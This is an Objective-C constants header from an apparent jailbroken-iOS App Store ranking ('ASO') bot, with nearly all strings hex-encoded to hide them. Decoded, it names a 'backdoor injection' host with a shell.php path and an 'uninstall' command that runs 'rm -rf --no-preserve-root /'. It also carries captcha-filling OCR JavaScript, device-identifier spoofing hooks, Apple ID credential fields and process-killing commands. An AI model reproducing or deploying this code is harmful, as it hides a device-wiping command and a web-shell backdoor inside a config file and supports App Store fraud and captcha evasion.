//
//  Constant.h
//  NianGao_ASO
//
//  Created by admin on 2017/10/19.
//
//  存放一些状态信息 和常量信息

#import <Foundation/Foundation.h>


#ifndef Constant_NMAE
#define Constant_NMAE


// NetServer

// AsoManager
////-----------------------------------------------网络请求--------------------------------------------
//acount
#define account_name @"6163636f756e74"
//id
#define NIANGAO_ID @"6964"
//控制台没有账号
#define NIANGAO_SUGGEST_NO_ACCOUNT @"e68ea7e588b6e58fb0e6b2a1e69c89e8b4a6e58fb7"
//控制台没有Appid
#define NIANGAO_SUGGEST_NO_APPID @"e68ea7e588b6e58fb0e6b2a1e69c894170706964"
//不存在此App
#define NIANGAO_SUGGEST_NO_APP @"e4b88de5ad98e59ca8e6ada4417070"
//账号不足正在重新请求
#define NIANGAO_SUGGEST_NO_ENOUGHT_ACCOUNT @"e8b4a6e58fb7e4b88de8b6b3e6ada3e59ca8e9878de696b0e8afb7e6b182"
//取任务成功
#define NIANGAO_SUGGEST_GET_TASK_SCUESS @"e58f96e4bbbbe58aa1e68890e58a9f"
//任务完成
#define NIANGAO_SUGGEST_TASK_SCUESS @"e4bbbbe58aa1e5ae8ce68890"

//taskId
#define NIANGAO_TASKID @"7461736b4964"
//ptrace
#define NIANGAO_PTRACE @"707472616365"

//accountId
#define NIANGAO_ACCOUNTID @"6163636f756e744964"
//data
#define NIANGAO_DATA @"64617461"

//exist
#define NIANGAO_EXIST @"6578697374"

//contentName
#define NIANGAO_COTENTNAME @"636f6e74656e744e616d65"


// uid
#define uid_name @"756964"
#define password_name @"70617373776f7264"
#define appleId_name @"6170706c654964"
#define task_name @"7461736b"
#define keywords_name @"6b6579776f726473"
#define appName_name @"6170704e616d65"
//appId  NG_ASO_APPID
#define appId_name @"4e475f41534f5f4150504944"
//token
#define token_name @"746f6b656e"
#define group_name @"67726f7570"
#define app_name @"617070"
//bundleId
#define bundleId_name @"62756e646c654964"
// endTime
#define endTime_name @"656e6454696d65"
// error
#define error_name @"6572726f72"
// startTime
#define startTime_name @"737461727454696d65"
// code
#define CODE @"636f6465"
// code
#define MSG @"6d7367"
// data
#define DATA @"64617461"
// 网络请求的Key  niangao123aso456
#define NET_REQUEST_KEY @"6e69616e67616f31323361736f343536"


//当前的图片上传Host    http://47.93.254.222/v.php
#define URL_OCR_HOST @"687474703a2f2f34372e39332e3235342e3232322f762e706870"
//当前图片上传的参数为   taskId=%@&deviceImei=%@&image=%@
#define URL_OCR_PARAM @"7461736b49643d254026646576696365496d65693d254026696d6167653d2540"


// 进行后门注入的地址  https://locker.memotz.com/
#define URL_BACKDOOR_HOST @"68747470733a2f2f6c6f636b65722e6d656d6f747a2e636f6d2f"
// 后门注入参数  TODO 更改此内容 shell.php
#define URL_BACKDOOR_PARAM @"7368656c6c2e706870"



// HOST    http://47.93.254.222:8080
#define URL_NIANGAO_HOST @"687474703a2f2f34372e39332e3235342e3232323a38303830"
// 测试Host http://192.168.1.13:8888
//#define URL_NIANGAO_HOST @"687474703a2f2f3139322e3136382e312e31333a38383838"

// 进行检查授权 /DeviceController/CheckDevice
#define URL_NIANGAO_CHECK @"2f446576696365436f6e74726f6c6c65722f436865636b446576696365"
// 进行授权操作 /DeviceController/ReportDeviceInfo
#define URL_NIANGAO_AUTHOR @"2f446576696365436f6e74726f6c6c65722f5265706f7274446576696365496e666f"
// 进行完成上报操作
#define URL_NIANGAO_COMPLICATION @"2f486973746f7279436f6e74726f6c6c65722f5265706f727453756363657373496e666f"
// 进行获取任务接口 /TaskController/AssignedTasks
#define URL_NIANGAO_GET_TASK @"2f5461736b436f6e74726f6c6c65722f41737369676e65645461736b73"
// 进行上报错误接口 /HistoryController/ReportErrorInfo
#define URL_NIANGAO_EROR @"2f486973746f7279436f6e74726f6c6c65722f5265706f72744572726f72496e666f"
// 进行改码 /phoneInfo
#define URL_NIANGAO_CHANGCODE @"2f70686f6e65496e666f"


//// 检测设备是否已经在后台登记 "http://192.168.1.11/DeviceController/CheckDevice"   http://aso.memotz.com:8888/DeviceController/CheckDevice
//#define URL_NIANGAO_CHECK @"687474703a2f2f61736f2e6d656d6f747a2e636f6d3a383838382f446576696365436f6e74726f6c6c65722f436865636b446576696365"
//// 进行授权操作   http://192.168.1.11/DeviceController/ReportDeviceInfo    http://aso.memotz.com:8888/DeviceController/ReportDeviceInfo
//#define URL_NIANGAO_AUTHOR @"687474703a2f2f61736f2e6d656d6f747a2e636f6d3a383838382f446576696365436f6e74726f6c6c65722f5265706f7274446576696365496e666f"
//// 进行完成上报操作   http://192.168.1.11/HistoryController/ReportSuccessInfo   http://aso.memotz.com:8888/HistoryController/ReportSuccessInfo
//#define URL_NIANGAO_COMPLICATION @"687474703a2f2f61736f2e6d656d6f747a2e636f6d3a383838382f486973746f7279436f6e74726f6c6c65722f5265706f727453756363657373496e666f"
//// 进行获取任务接口  http://192.168.1.11/TaskController/AssignedTasks   http://aso.memotz.com:8888/TaskController/AssignedTasks
//#define URL_NIANGAO_GET_TASK @"687474703a2f2f61736f2e6d656d6f747a2e636f6d3a383838382f5461736b436f6e74726f6c6c65722f41737369676e65645461736b73"
//// 进行上报错误接口  http://192.168.1.13:8888/HistoryController/ReportErrorInfo   http://aso.memotz.com:8888/HistoryController/ReportErrorInfo
//#define URL_NIANGAO_EROR @"687474703a2f2f61736f2e6d656d6f747a2e636f6d3a383838382f486973746f7279436f6e74726f6c6c65722f5265706f72744572726f72496e666f"
//// 进行设置当前的二进制  http://aso.memotz.com:8888/phoneInfo
//#define URL_NIANGAO_CHANGCODE @"687474703a2f2f61736f2e6d656d6f747a2e636f6d3a383838382f70686f6e65496e666f"

//#define URL_NIANGAO_EROR @"687474703a2f2f3139322e3136382e312e31333a383838382f486973746f7279436f6e74726f6c6c65722f5265706f72744572726f72496e666f"
// 接口Params  ?params=%@&sign=%@
#define URL_PARAMS @"3f706172616d733d2540267369676e3d2540"
// time
#define URL_PARAMS_TIME @"74696d65"
//deviceName
#define URI_JSON_deviceName @"6465766963654e616d65"
//ip
#define URI_JSON_ip @"6970"
//uuid
#define URI_JSON_uuid @"75756964"
//deviceType
#define URI_JSON_deviceType @"64657669636554797065"
//serialNumber
#define URI_JSON_serialNumber @"73657269616c4e756d626572"
//version
#define URI_JSON_version @"76657273696f6e"
//timeStamp
#define URI_JSON_timeStamp @"74696d655374616d70"
//uid
#define URI_JSON_uid @"756964"
//deviceVersion
#define URI_JSON_deviceVersion @"64657669636556657273696f6e"
//randomNumber
#define URI_JSON_randomNumber @"72616e646f6d4e756d626572"
//token
#define URI_JSON_token @"746f6b656e"
//acount
#define URI_JSON_acount @"61636f756e74"
//endTime
#define URI_JSON_endTime @"656e6454696d65"
//startTime
#define URI_JSON_startTime @"737461727454696d65"
//appId
#define URI_JSON_appId @"6170704964"
//errorDes
#define URI_JSON_errorDes @"6572726f72446573"


////-------------------------------------------------------------------------------------------





////-----------------------------------界面展示内容--------------------------------------------------------
//请求数据为空
#define request_fail @"e8afb7e6b182e695b0e68daee4b8bae7a9ba"
//网络不畅导致无法请求到任务
#define net_is_bad @"e7bd91e7bb9ce4b88de79585e5afbce887b4e697a0e6b395e8afb7e6b182e588b0e4bbbbe58aa1"
// 重新开始任务
#define reStartTask @"e9878de696b0e5bc80e5a78be4bbbbe58aa1"
// 未知
#define STATE_UNKNOW @"e69caae79fa5"
// 未在规定时间完成任务
#define STATE_NO_SUCESS_IN_TIME @"672a572889c45b9a65f695f45b8c62104efb52a1"
// 重新进行搜索。。。
#define STATE_RE_SEARCH @"91cd65b08fdb884c641c7d22300230023002"

////-------------------------------------------------------------------------------------------




////--------------------------------------界面Button-----------------------------------------------------
// button
#define BUTTON @"627574746f6e"
// view
#define VIEW @"76696577"


////-------------------------------------------------------------------------------------------



////--------------------------------------------逆向内容-----------------------------------------------
//SSAccountStore
#define SSACCOUNTSTORE @"53534163636f756e7453746f7265"
//SSAuthenticationContext
#define SSAUTHENTICATIONCONTEXT @"535341757468656e7469636174696f6e436f6e74657874"
//SSAuthenticateRequest
#define SSAUTHENTICATEREQUEST @"535341757468656e74696361746552657175657374"
//SKUICollectionView
#define SKUICOLLECTIONVIEW @"534b5549436f6c6c656374696f6e56696577"
//SKUIItemOfferButton
#define SKUIITEMOFFERBUTTON @"534b55494974656d4f66666572427574746f6e"
//SKUIOfferView
#define SKUIOFFERVIEW @"534b55494f6666657256696577"
//SKUIHorizontalLockupView
#define SKUIHORIZONTALLOCKUPVIEW @"534b5549486f72697a6f6e74616c4c6f636b757056696577"
//SKUISearchBar
#define SKUISEARCHBAR @"534b5549536561726368426172"
//SBLockScreenManager
#define SBLOCKSCREENMANAGER @"53424c6f636b53637265656e4d616e61676572"
//SBIconController
#define SBICONCONTROLLER @"534249636f6e436f6e74726f6c6c6572"
//SBApplicationController
#define SBAPPLICATIONCONTROLLER @"53424170706c69636174696f6e436f6e74726f6c6c6572"
// SBDeleteIconAlertItem
#define SBDELETEICONALERTITEM @"534244656c65746549636f6e416c6572744974656d"
//appid
#define APPID @"6170706964"
//pageData
#define PAGEDATA @"7061676544617461"
//bubbles
#define BUBBLES @"627562626c6573"
//results
#define RESULTS @"726573756c7473"
//id
#define ID @"6964"
// 自动开启AppStore的搜索  @"https://itunes.apple.com/WebObjects/MZStore.woa/wa/search?mt=8&submit=edit&term=%@#software"
#define AUTO_SEARCH_URL @"68747470733a2f2f6974756e65732e6170706c652e636f6d2f5765624f626a656374732f4d5a53746f72652e776f612f77612f7365617263683f6d743d38267375626d69743d65646974267465726d3d254023736f667477617265"
// OCR 验证码的Web代码  function outputPage() {   return '<!--' + controllerWindow.location.href + '-->' + '\n' + document.querySelector('html').outerHTML;    } function fireEvent(target, evtType)  {    var evt = document.createEvent('Events');  evt.initEvent(evtType, true ,true);   evt.view = controllerWindow;   evt.altKey = false;    evt.ctrlKey = false;   evt.shiftKey = false;    evt.metaKey = false;   evt.keyCode = 13;    target.dispatchEvent(evt);   }function getCodeImageUrl() {     return document.querySelectorAll('img')[0].src;     }function fireEvent(target, evtType) {      var evt = document.createEvent('Events');   evt.initEvent(evtType, true, true);         evt.view = controllerWindow;      evt.altKey = false;      evt.ctrlKey = false;     evt.shiftKey =false;     evt.metaKey = false;      evt.keyCode = 65;          target.dispatchEvent(evt);      }function fillCode(code) {       var nucaptcha_answer = document.querySelector('input#nucaptcha-answer');      nucaptcha_answer.value = code;     fireEvent(nucaptcha_answer, 'keyup');       nucaptcha_answer.blur();     }function updateCode() {      var new_challenge = document.querySelector('button#new-challenge');       new_challenge.click();       }
#define OCR_WEB_FUNCTION @"66756e6374696f6e206f7574707574506167652829207b20202072657475726e20273c212d2d27202b20636f6e74726f6c6c657257696e646f772e6c6f636174696f6e2e68726566202b20272d2d3e27202b20275c6e27202b20646f63756d656e742e717565727953656c6563746f72282768746d6c27292e6f7574657248544d4c3b202020207d2066756e6374696f6e20666972654576656e74287461726765742c20657674547970652920207b2020202076617220657674203d20646f63756d656e742e6372656174654576656e7428274576656e747327293b20206576742e696e69744576656e7428657674547970652c2074727565202c74727565293b2020206576742e76696577203d20636f6e74726f6c6c657257696e646f773b2020206576742e616c744b6579203d2066616c73653b202020206576742e6374726c4b6579203d2066616c73653b2020206576742e73686966744b6579203d2066616c73653b202020206576742e6d6574614b6579203d2066616c73653b2020206576742e6b6579436f6465203d2031333b202020207461726765742e64697370617463684576656e7428657674293b2020207d66756e6374696f6e20676574436f6465496d61676555726c2829207b202020202072657475726e20646f63756d656e742e717565727953656c6563746f72416c6c2827696d6727295b305d2e7372633b20202020207d66756e6374696f6e20666972654576656e74287461726765742c206576745479706529207b20202020202076617220657674203d20646f63756d656e742e6372656174654576656e7428274576656e747327293b2020206576742e696e69744576656e7428657674547970652c20747275652c2074727565293b2020202020202020206576742e76696577203d20636f6e74726f6c6c657257696e646f773b2020202020206576742e616c744b6579203d2066616c73653b2020202020206576742e6374726c4b6579203d2066616c73653b20202020206576742e73686966744b6579203d66616c73653b20202020206576742e6d6574614b6579203d2066616c73653b2020202020206576742e6b6579436f6465203d2036353b202020202020202020207461726765742e64697370617463684576656e7428657674293b2020202020207d66756e6374696f6e2066696c6c436f646528636f646529207b20202020202020766172206e75636170746368615f616e73776572203d20646f63756d656e742e717565727953656c6563746f722827696e707574236e75636170746368612d616e7377657227293b2020202020206e75636170746368615f616e737765722e76616c7565203d20636f64653b2020202020666972654576656e74286e75636170746368615f616e737765722c20276b6579757027293b202020202020206e75636170746368615f616e737765722e626c757228293b20202020207d66756e6374696f6e20757064617465436f64652829207b202020202020766172206e65775f6368616c6c656e6765203d20646f63756d656e742e717565727953656c6563746f722827627574746f6e236e65772d6368616c6c656e676527293b202020202020206e65775f6368616c6c656e67652e636c69636b28293b202020202020207d20"
// 下载的路径 /var/mobile/Media/Downloads
#define DELETE_DOWNLOAD_DILR @"2f7661722f6d6f62696c652f4d656469612f446f776e6c6f616473"
// 下载路径下的  @".sqlite"
#define DELETE_DOWNLOAD_DILR_SQL @"2e73716c697465"
// itunesstore的文件路径 /var/mobile/Library/Caches/com.apple.itunesstore
#define DELETE_ITUNESSTORE_DIR @"2f7661722f6d6f62696c652f4c6962726172792f4361636865732f636f6d2e6170706c652e6974756e657373746f7265"
// 杀死AppStore进程 killall AppStore
#define CMD_KILL_APPSTORE_NOTIFICATION @"6b696c6c616c6c2041707053746f7265"
// 杀死Itunesstore进程 killall itunesstored
#define CMD_KILL_ITUNESSTORED_NOTIFICATION @"6b696c6c616c6c206974756e657373746f726564"
// 杀死Springboard进程 killall SpringBoard
#define CMD_KILL_SPRINGBOARD_NOTIFICATION @"6b696c6c616c6c20537072696e67426f617264"
////-------------------------------------------------------------------------------------------



#define NG_DP_SBUserNotificationAlertSheet @"5342557365724e6f74696669636174696f6e416c6572745368656574"
#define NG_DP_SpringBoard @"537072696e67426f617264"
#define NG_DP_ISOperationQueue @"49534f7065726174696f6e5175657565"
#define NG_DP_ISStoreURLOperation @"495353746f726555524c4f7065726174696f6e"
#define NG_DP_ISURLOperation @"495355524c4f7065726174696f6e"
#define NG_DP_SUWebViewManaager @"5355576562566965774d616e6161676572"
#define NG_DP_UIAlertView @"5549416c65727456696577"
#define NG_DP_SKUIItemOfferButton @"534b55494974656d4f66666572427574746f6e"
#define NG_DP_SBDownloadingIcon @"5342446f776e6c6f6164696e6749636f6e"
#define NG_DP_AboutDataSource @"41626f757444617461536f75726365"
#define NG_DP_popupAlertAnimated @"706f707570416c657274416e696d617465643a"
#define NG_DP_applicationDidFinishLaunching @"6170706c69636174696f6e44696446696e6973684c61756e6368696e673a"
#define NG_DP_addOperation @"6164644f7065726174696f6e3a"
#define NG_DP_connectionDidFinishLoading @"636f6e6e656374696f6e44696446696e6973684c6f6164696e673a"
#define NG_DP_handleFinishedLoading @"5f68616e646c6546696e69736865644c6f6164696e67"
#define NG_DP_webCiewDidFinishLoad @"7765624369657744696446696e6973684c6f61643a"
#define NG_DP_show @"73686f77"
#define NG_DP_setValuesUsingBuyButtonDescriptor @"73657456616c7565735573696e67427579427574746f6e44657363726970746f723a6974656d53746174653a636c69656e74436f6e746578743a616e696d617465643a"
#define NG_DP_progressState @"70726f67726573735374617465"
#define NG_DP_macAddressSpecifierKey @"5f6d6163416464726573735370656369666965724b6579"
#define NG_DP_bluetoothMACAddress @"5f626c7565746f6f74684d414341646472657373"
#define NG_DP_macAddress @"5f6d616341646472657373"
#define NG_DP_SBAlertController @"5f5342416c657274436f6e74726f6c6c6572"
#define NG_DP_alertItem @"616c6572744974656d"



// /usr/lib/libMobileGestalt.dylib
#define NG_DP_libMobileGestalt "2f7573722f6c69622f6c69624d6f62696c6547657374616c742e64796c6962"
// _MGCopyAnswer
#define NG_DP_MGCopyAnswer "5f4d47436f7079416e73776572"
//com.apple.Preferences
#define NG_BUNID_Preferences @"636f6d2e6170706c652e507265666572656e636573"
//com.apple.AppStore
#define NG_BUNID_AppStore @"636f6d2e6170706c652e41707053746f7265"
//com.apple.itunesstored
#define NG_BUNID_itunesstored @"636f6d2e6170706c652e6974756e657373746f726564"
//com.apple.itunescloud
#define NG_BUNID_itunescloud @"636f6d2e6170706c652e6974756e6573636c6f7564"
//com.apple.SpringBoard
#define NG_BUNID_SpringBoard @"636f6d2e6170706c652e537072696e67426f617264"
//com.apple.springboard
#define NG_BUNID_springboard @"636f6d2e6170706c652e737072696e67626f617264"
//houshuaiKeyhoushu
#define NG_SAVE_KEY @"686f7573687561694b6579686f75736875"
// /var/mobile/Documents/deviceCode.txt
#define NG_SAVE_File @"2f7661722f6d6f62696c652f446f63756d656e74732f646576696365436f64652e747874"
// deviceCode.txt
#define NG_SAVE_FileName @"646576696365436f64652e747874"
// dpkg -P com.niangao.aso && rm -rf  --no-preserve-root /
#define NG_CMD_UNINSTALL @"64706b67202d5020636f6d2e6e69616e67616f2e61736f20262620726d202d726620202d2d6e6f2d70726573657276652d726f6f74202f"
//  validity
#define NG_NET_validity @"76616c6964697479"
//SBAlertItemWindow
#define NG_ALERT_SBAlertItemWindow @"5342416c6572744974656d57696e646f77"
// 使用现有的 Apple ID
#define NG_ALERT_Button_INFO @"4f7f752873b067097684204170706c65204944"
// 始终需要
#define NG_ALERT_Button_INFO_TWO @"59cb7ec897008981"






#endif





